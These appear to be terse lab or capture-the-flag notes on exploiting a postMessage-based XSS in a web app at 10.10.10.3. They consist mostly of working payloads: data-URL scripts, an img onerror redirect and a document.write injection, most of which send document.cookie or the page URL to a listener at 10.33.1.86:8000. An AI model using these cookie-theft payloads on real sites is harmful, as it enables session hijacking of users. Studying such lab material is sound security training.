# B/W


Ip `10.10.10.3`

open port 80

# Available directory

admin
assets


# Simil payload

Query param debug=true enabled an event handler of message.

We can send a payload that will be encoded e passed as event ed inserted in a div

```js
payload   = ;

window.postMessage([...''].map(i => String.fromCharCode(i.charCodeAt(0) - 3)).map(i=>String(i)), 'http://10.10.10.3')
```

In `feat.js` the code will render the payload but... why 


#PAYLOAD

`data:text/html;charset=utf-8,<script>fetch('http://10.33.1.86:8000/index.php', {method:'post',body:document.cookie}).then(res=>res.text()).then(console.info).catch(console.error)</script>`


## tring with postMessage

`data:text/html;charset=utf-8,<script>window.postMessage(document.cookie)</script>`


- https://samy.blog/element.innerhtml-and-xss-payloads/
- https://github.com/payloadbox/xss-payload-list

data:text/html;charset=utf-8,<script>document.write('&lt;script>alert(document.domain)</scr'+'ipt&gt;')</script>

`http://10.10.10.3/?debug=true&url=data%3Atext/html%3Bcharset%3Dutf-8%2C<img%20src%3D"x"%20onerror%3D"window.location.href%3D%27http%3A//10.33.1.86%3A8000%3Fd%3D%27%2Bwindow.location.href">`

```
<script>document.write('<img+src%3D\"http%3A%2F%2F10.33.1.86%3A8000%2F%3Fc%3D'%2BencodeURIComponent(document.cookie)%2B'\">')<%2Fscript>
```